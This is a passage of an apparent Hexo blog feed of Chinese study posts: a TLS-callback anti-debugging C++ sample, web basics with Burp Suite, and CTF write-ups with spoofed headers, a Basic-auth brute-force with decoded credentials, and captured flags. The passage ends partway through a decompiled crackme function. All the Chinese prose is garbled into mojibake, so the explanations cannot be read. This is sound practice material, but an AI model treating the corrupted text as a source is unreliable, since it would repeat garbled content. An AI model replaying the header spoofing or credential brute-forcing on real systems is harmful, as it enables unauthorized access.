class="built_in">wsprintfA</span>(szMsg, <span class="string">&quot;%d&quot;</span>, CheckIsChildren);</span><br><span class="line"><span class="built_in">print</span>(szMsg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">MyThreadFunction</span><span class="params">(LPVOID lpParam)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Thread running with value: &quot;</span> &lt;&lt; CheckIsChildren &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;why dont play\n&quot;</span>;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (CheckIsChildren == <span class="number">0</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">2</span>;</span><br><span class="line">std::cout &lt;&lt; CheckIsChildren &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">PROCESS_INFORMATION ProInfo;</span><br><span class="line">STARTUPINFO StartInfo;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;StartInfo, <span class="built_in">sizeof</span>(StartInfo));</span><br><span class="line">TCHAR ModulePath[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, ModulePath, <span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*CreateProcess(NULL,</span></span><br><span class="line"><span class="comment">ModulePath,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">TRUE,</span></span><br><span class="line"><span class="comment">DEBUG_PROCESS,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">&amp;StartInfo,</span></span><br><span class="line"><span class="comment">&amp;ProInfo);</span></span><br><span class="line"><span class="comment">WaitForSingleObject(ProInfo.hProcess, INFINITE);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hProcess);</span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hThread);</span></span><br><span class="line"><span class="comment">printf(&quot;\nfinished\n&quot;);*/</span></span><br><span class="line">DWORD threadId;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,                   <span class="comment">// é»˜è®¤å®‰å…¨å±æ€§</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// é»˜è®¤å †æ ˆå¤§å°</span></span><br><span class="line">MyThreadFunction,       <span class="comment">// çº¿ç¨‹å‡½æ•°</span></span><br><span class="line">&amp;input,                 <span class="comment">// ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// é»˜è®¤åˆ›å»ºæ ‡å¿—</span></span><br><span class="line">&amp;threadId               <span class="comment">// è¿”å›çº¿ç¨‹ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//Sleep(1000);</span></span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NO!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes,yes,yes&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œå¦‚æœvsä¸­éœ€è¦ç”ŸæˆReleaseç‰ˆæœ¬ï¼Œä¼šå¯¼è‡´TLSå¤±æ•ˆï¼Œå¯ä»¥ä»å±æ€§-C/C+Â±ä¼˜åŒ–ä¸­æŠŠå…¨ç¨‹åºä¼˜åŒ–å…³æ‰</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ç»¼åˆä¿æŠ¤ </category>
          
          <category> TLSçº¿ç¨‹å›è°ƒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åè°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨</title>
      <link href="/posts/f3edc96d.html"/>
      <url>/posts/f3edc96d.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¼€å‘è€…å·¥å…·æ‰“å¼€æ–¹å¼">å¼€å‘è€…å·¥å…·æ‰“å¼€æ–¹å¼</h3><ul><li>F12/command option I<br>ctrl shift I</li><li>å³ä¸Šè§’æ›´å¤šï¼Œå¼€å‘äººå‘˜å·¥å…·</li><li>å³é”®é¡µé¢ï¼Œæ£€æŸ¥</li></ul><h3 id="Burpsuitä½¿ç”¨åœºæ™¯">Burpsuitä½¿ç”¨åœºæ™¯</h3><h4 id="æŠ“åŒ…">æŠ“åŒ…</h4><p>åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´æ”¾ä¸€ä¸ªä¸­é—´äººï¼Œä¸¤è¾¹åªå’Œä¸­é—´äººç›¸è”ç³»ï¼Œé€šè¿‡ä¸­é—´äººï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤è¾¹äº¤äº’çš„æ•°æ®ä»¥åŠä¿®æ”¹å®ƒä»¬</p><h4 id="é‡æ”¾">é‡æ”¾</h4><p>å‘é€åˆ°é‡æ”¾ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å†…å®¹ç„¶åå†å‘é€</p><h4 id="çˆ†ç ´">çˆ†ç ´</h4><p>å‘é€åˆ°çˆ†ç ´ï¼Œéå†ä¸€äº›å†…å®¹å¹¶å‘é€ï¼Œå®ç°çˆ†ç ´æ”»å‡»å¾—åˆ°æƒ³è¦çš„ä¸œè¥¿</p><h4 id="ç¼–ç è§£ç ">ç¼–ç è§£ç </h4><p>å¾—åˆ°çš„å“åº”åŒ…å¯èƒ½æ˜¯ç¼–ç åçš„å†…å®¹ï¼Œä½¿ç”¨è§£ç æ¥æŸ¥çœ‹ç”Ÿå­—ç¬¦ï¼Œæˆ–è€…æŠŠä¿¡æ¯ç¼–ç åå‘é€</p><h3 id="http">http</h3><p>å®¢æˆ·ç«¯/æœåŠ¡ç«¯ï¼šå‰è€…æ˜¯è¯·æ±‚å†…å®¹çš„ï¼Œåè€…æ˜¯è®¡ç®—å¹¶æä¾›å†…å®¹çš„</p><p>è¯·æ±‚åŒ…/ç›¸åº”åŒ…ï¼šå®¢æˆ·ç«¯å‘ç»™æœåŠ¡ç«¯çš„åŒ…ï¼ŒæœåŠ¡ç«¯å“åº”å®¢æˆ·ç«¯è¿”å›çš„åŒ…</p><h4 id="è¯·æ±‚åŒ…-ç›¸åº”åŒ…æ ¼å¼">è¯·æ±‚åŒ…/ç›¸åº”åŒ…æ ¼å¼</h4><h5 id="è¯·æ±‚è¡Œ">è¯·æ±‚è¡Œ</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /?wllm=<span class="number">2</span>%<span class="number">27</span>% HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>å­—æ®µ</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>è¯·æ±‚æ–¹æ³•</td><td>è¯´æ˜æ˜¯getè¿˜æ˜¯post</td></tr><tr><td>URLå­—æ®µ</td><td>å¦‚æœæ˜¯getå°±ä¼šæœ‰getå†…å®¹çš„å…·ä½“è¯´æ˜</td></tr><tr><td>HTTPç‰ˆæœ¬åè®®</td><td>1.1æˆ–1.0</td></tr></tbody></table><h5 id="è¯·æ±‚å¤´">è¯·æ±‚å¤´</h5><p><a href="https://blog.csdn.net/qq_42684504/article/details/106634035">HTTP è¯·æ±‚å¤´å„å‚æ•°å…·ä½“å«ä¹‰_è¯·æ±‚å¤´çš„å‚æ•°è¯¦è§£-CSDNåšå®¢</a></p><h5 id="ç©ºè¡Œ">ç©ºè¡Œ</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨äºåˆ†éš”è¯·æ±‚å¤´å’Œæ•°æ®</p><h5 id="è¯·æ±‚æ•°æ®">è¯·æ±‚æ•°æ®</h5><p>å¦‚æœæ˜¯GETï¼Œåˆ™ä¸ºç©ºè¡Œï¼Œå¦‚æœæ˜¯POSTï¼Œåˆ™æ˜¯xxx=xxx&amp;xxx=xxxå½¢å¼çš„å˜é‡åŠå€¼</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params<span class="operator">=</span>BbITMWZukVrbpcvF<span class="number">9E9</span>subK<span class="number">2</span><span class="keyword">c</span><span class="number">4</span>G<span class="number">5</span>qLX<span class="number">0</span>zQfWyh<span class="number">3</span>TukD<span class="number">43</span>kI<span class="variable">%2</span>BdaOFlA<span class="number">9</span>rOJTasxuH<span class="number">9</span>cRGzv<span class="number">8</span>A<span class="variable">%2</span>BTuJIi<span class="variable">%2</span>Fq<span class="number">6</span>QDciuadCEJ<span class="number">1</span>ppF<span class="number">6</span>eP<span class="number">8</span>k<span class="number">2</span>wR<span class="variable">%2</span>FkQiZnohRO&amp;encSecKey<span class="operator">=</span>decd<span class="number">4703</span>eddd<span class="number">42253</span>cb<span class="number">59259</span><span class="keyword">c</span><span class="number">60</span>f<span class="number">689869</span>cb<span class="number">6</span>df<span class="number">59</span>b<span class="number">7</span>ab<span class="number">906917</span>f<span class="number">23</span>b<span class="number">76</span>eb<span class="number">2</span>d<span class="number">5393</span>b<span class="number">40e1</span>bbd<span class="number">0</span>b<span class="number">697700288149</span>d<span class="number">4</span>ca<span class="number">398</span>a<span class="number">8</span><span class="keyword">c</span><span class="number">20</span>f<span class="number">000</span><span class="keyword">cc</span><span class="number">3</span>f<span class="number">47452984</span>d<span class="number">6665</span><span class="keyword">c</span><span class="number">5183</span><span class="keyword">c</span><span class="number">1330729</span>fed<span class="number">3</span>d<span class="number">63e4011495</span>f<span class="number">3</span>cee<span class="number">6</span>ff<span class="number">4e29</span>d</span><br></pre></td></tr></table></figure><h4 id="å“åº”ç ">å“åº”ç </h4><p><a href="https://www.runoob.com/http/http-status-codes.html">HTTP çŠ¶æ€ç  | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h4 id="robot-txt">robot.txt</h4><p>å¦‚æœç½‘ç«™æ ¹ç›®å½•æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œåˆæ³•çš„çˆ¬è™«çˆ¬å–æ—¶å°±ä¼šä¾ç…§è¿™ä¸ªæ–‡ä»¶çš„è¦æ±‚å»(ä¸)çˆ¬å–ç›¸åº”çš„æ–‡ä»¶</p><p>æ ¼å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><p>User-agentç”¨äºè¡¨æ˜è‡ªå·±çš„èº«ä»½æˆ–åŒºåˆ†ç”¨é€”</p><p>æ¯”å¦‚ï¼šGooglebotï¼ŒGooglebot-Imageï¼ŒStorebot-Googleï¼ŒBingbotç­‰</p><p>Disallowç”¨äºå†™å…¥ä¸å…è®¸è®¿é—®çš„ç›®å½•æˆ–æ–‡ä»¶ï¼Œä¼¼ä¹æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼</p><p>Allowç”¨äºåªèƒ½è®¿é—®å¯¹åº”çš„ç›®å½•æˆ–æ–‡ä»¶ï¼Œä¼¼ä¹æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /blog Allow: /blog/allowed-post</span><br></pre></td></tr></table></figure><p>åªå…è®¸è®¿é—®allowed-postï¼Œè€ŒåŒç›®å½•ä¸‹å…¶å®ƒçš„ä¸èƒ½è®¿é—®</p><h2 id="WP">WP</h2><h3 id="gift-F12">gift_F12</h3><p>æ ¹æ®æç¤ºï¼Œf12æ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼Œæ‰¾åˆ°æºç ï¼Œå‘ç°flagï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">WLLMCTF</span><span class="template-variable">&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;</span></span><br></pre></td></tr></table></figure><h3 id="get-post">get_post</h3><p>å‘é€getå’Œpostè¯·æ±‚å³å¯</p><h3 id="Do-you-know-HTTP">Do you know HTTP</h3><p>æ ¹æ®è¦æ±‚ä¿®æ”¹è¯·æ±‚å¤´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HS</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node5.anna.nssctf.cn:<span class="number">22621</span></span><br><span class="line"><span class="attribute">Gecko</span>/<span class="number">20100101</span> Firefox/<span class="number">115</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/jxl,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Referer</span>: www.ltyyds.com</span><br><span class="line"><span class="attribute">User</span>-Agent: LT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹è¢«å‘äº†ï¼Œåœ¨æœ€åæ”¾äº†ä¸€ä¸ªUser-Agent: LTä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºä¸æ¥ï¼Œç»“æœå‘ç°åœ¨ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªUser-Agentï¼Œåˆ äº†å°±å‡ºäº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;e6688e51-abc6-<span class="number">4943</span>-b819-<span class="number">3</span>e4d967c9457&#125;</span><br></pre></td></tr></table></figure><h3 id="robots">robots</h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœºæ™¯å¯åŠ¨ä¸äº†</p><p>æ²¡å†™</p><h3 id="ctfhub-webå‰ç½®-http">ctfhub-webå‰ç½®-http</h3><h4 id="è¯·æ±‚æ–¹å¼">è¯·æ±‚æ–¹å¼</h4><p>ç›´æ¥ä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸ºCTFHUB</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">0</span>a211e2f0ed998f0bb25c674&#125; </span><br></pre></td></tr></table></figure><h4 id="302è·³è½¬">302è·³è½¬</h4><p>å¥½æ€ªï¼Œè·Ÿç€wpåšå‡ºæ¥äº†</p><p>ä½†æ˜¯è¿˜æ˜¯ä¸ç†è§£ä¸ºä»€ä¹ˆé‡æ”¾ï¼ˆé‡æ”¾æœ‰è‡ªåŠ¨æ‹¦æˆªåŠŸèƒ½ï¼Œå¯ä»¥ç‚¹å‡»è·Ÿéšé‡å®šå‘å¾—åˆ°é‡å®šå‘åçš„å†…å®¹ï¼‰ä¸€éå°±å¥½äº†ï¼Œå‘é€çš„åŒ…éƒ½æ˜¯ä¸€æ ·çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">1</span>b0aee8a83c3e0d0322ce749&#125;</span><br></pre></td></tr></table></figure><h4 id="Cookie">Cookie</h4><p>åœ¨è¯·æ±‚å¤´ä¸­æŠŠadminæ”¹æˆ1</p><h4 id="åŸºç¡€è®¤è¯">åŸºç¡€è®¤è¯</h4><p>å…ˆæŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸²base64ï¼Œè§£ç åå‘ç°æ˜¯ç”¨æˆ·å:å¯†ç </p><p>å¥½åƒç»™äº†ä¸€äº›èƒ½çˆ†ç ´çš„å¯†ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ç”¨æˆ·åï¼Œå…ˆçŒœä¸€ä¸ªadmin</p><p>ç„¶ååœ¨intruderé‡Œé¢</p><p><img src="https://s2.loli.net/2024/07/26/wyDjHabJuh783ek.png" alt="image-20240726164807767"></p><p>è¿™æ ·å¼€å§‹çˆ†ç ´</p><p>æ²¡å‡ºæ¥ï¼Œéš¾å—ã€‚å»ç½‘ä¸Šçœ‹wpï¼Œå®ƒä»¬è¯´è¦æŠŠä¸‹é¢çš„payloadURLç¼–ç å»æ‰ï¼Œç„¶åå°±å¯¹äº†ï¼Œä¸ç†è§£</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">YWRtaW46bXVzdGFuZw</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">ctfhub&#123;<span class="number">6</span>fd9a3602ed44a12e16ba9eb&#125;</span><br></pre></td></tr></table></figure><h4 id="ç›¸åº”åŒ…æºä»£ç ">ç›¸åº”åŒ…æºä»£ç </h4><p>ç‚¹å‡»æŒ‰é’®ï¼Œæ²¡ç”¨æ‹¦åˆ°ä¿¡æ¯ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯å‘äº†ä¸€ä¸ªä»£ç è¿‡æ¥</p><p>f12çœ‹æºä»£ç </p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">669</span><span class="keyword">c</span><span class="number">2</span>d<span class="number">83e81</span><span class="keyword">c</span><span class="number">22</span><span class="keyword">c</span><span class="number">497</span>bece<span class="number">5</span>b&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> web </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æš‘å‡å­¦ä¹ è®°å½•2</title>
      <link href="/posts/d7a4634e.html"/>
      <url>/posts/d7a4634e.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>ç›®å½•ï¼š</p><p><a href="https://www.pri87.vip/posts/4ead32f4.html">å­¦ä¹ è®°å½•1</a></p><p><a href="https://www.pri87.vip/posts/d7a4634e.html">å­¦ä¹ è®°å½•2</a> &lt;=</p></div><p>è¿˜æ˜¯å·®ä¸å¤šï¼Œæ²¡å†™ä»€ä¹ˆä¸œè¥¿ï¼Œä¹Ÿæ²¡å­¦å¤šå°‘</p><hr><h2 id="wp">wp:</h2><h3 id="crackme-100">crackme-100</h3><p>åœ¨å­¦äº’æ–¥ä½“çš„æ—¶å€™çœ‹åˆ°çš„ä¸€ä¸ªcrackme</p><p>ä¸€è¿›mainå‡½æ•°çœ‹åˆ°äº†ä¸èƒ½è¢«è§£æçš„å†…å®¹</p><p><img src="https://s2.loli.net/2024/08/05/SvDRnMdlOagCbrT.png" alt="img"></p><p>ä¸æ•¢ä¹±åŠ¨ï¼Œè¿˜æ˜¯ç›´æ¥çœ‹æ±‡ç¼–å§</p><p>è¿™é‡Œçš„æ±‡ç¼–æ˜¯åˆ¤æ–­äº†ä¸¤æ¬¡é•¿åº¦ï¼Œç„¶åè¿›å…¥äº†ä¸€ä¸ªå‡½æ•°æ£€æŸ¥,è¿™ä¸ªæ˜¯ç¬¬ä¸€ä¸ªåœ°æ–¹</p><p>è¿›å»çœ‹çœ‹</p><p><img src="https://s2.loli.net/2024/08/05/Skv5cEfN1K8rMx4.png" alt="img"></p><p>å‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_401180</span><span class="params">(<span class="type">char</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPWSTR CommandLineW; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR v6; <span class="comment">// edi</span></span><br><span class="line">  WCHAR v7; <span class="comment">// cx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// edi</span></span><br><span class="line">  __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax</span></span><br><span class="line">  __int16 v11; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  _WORD *v13; <span class="comment">// edi</span></span><br><span class="line">  __int16 v14; <span class="comment">// cx</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+10h] [ebp-11A8h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesRead; <span class="comment">// [esp+20h] [ebp-1198h] BYREF</span></span><br><span class="line">  SIZE_T NumberOfBytesWritten; <span class="comment">// [esp+24h] [ebp-1194h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOW</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+28h] [ebp-1190h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+70h] [ebp-1148h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [esp+D0h] [ebp-10E8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">3</span>]; <span class="comment">// [esp+3A0h] [ebp-E18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+3ACh] [ebp-E0Ch]</span></span><br><span class="line">  <span class="type">int</span> Buffer[<span class="number">255</span>]; <span class="comment">// [esp+3B0h] [ebp-E08h] BYREF</span></span><br><span class="line">  _BYTE v25[<span class="number">2</span>]; <span class="comment">// [esp+7AEh] [ebp-A0Ah] BYREF</span></span><br><span class="line">  WCHAR CommandLine[<span class="number">1282</span>]; <span class="comment">// [esp+7B0h] [ebp-A08h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(CommandLine, <span class="number">0</span>, <span class="number">0xA00</span>u);</span><br><span class="line">  CommandLineW = GetCommandLineW();</span><br><span class="line">  v3 = CommandLineW;</span><br><span class="line">  <span class="keyword">while</span> ( *CommandLineW++ )</span><br><span class="line">    ;</span><br><span class="line">  v5 = (<span class="type">char</span> *)CommandLineW - (<span class="type">char</span> *)v3;</span><br><span class="line">  v6 = (LPWSTR)v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v6[<span class="number">1</span>];</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 );</span><br><span class="line">  qmemcpy(v6, v3, v5);</span><br><span class="line">  v8 = v25;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *((_WORD *)v8 + <span class="number">1</span>);</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 );</span><br><span class="line">  *(_DWORD *)v8 = <span class="number">32</span>;</span><br><span class="line">  v10 = this;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = *(_WORD *)v10;</span><br><span class="line">    v10 += <span 